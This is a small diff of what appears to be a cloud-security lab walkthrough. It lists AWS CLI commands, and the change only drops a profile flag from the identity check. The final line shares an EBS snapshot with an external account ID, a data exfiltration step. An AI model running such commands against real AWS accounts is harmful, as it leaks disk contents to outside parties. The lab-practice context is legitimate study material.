@@ -21,7 +21,7 @@ aws --profile vulnlambda ec2 create-snapshot --region us-east-2 --volume-id "vol
 
 aws --profile vulnlambda ec2 describe-snapshots --region us-east-2 --snapshot-ids snap-0daaac465901b9632 # check on snapshot progress
 
-aws --profile vulnlambda sts get-caller-identity
+aws sts get-caller-identity
 
 aws --profile vulnlambda ec2 modify-snapshot-attribute --region us-east-2 --snapshot-id snap-0daaac465901b9632 --attribute createVolumePermission --operation-type add --user-ids 480927147553
 
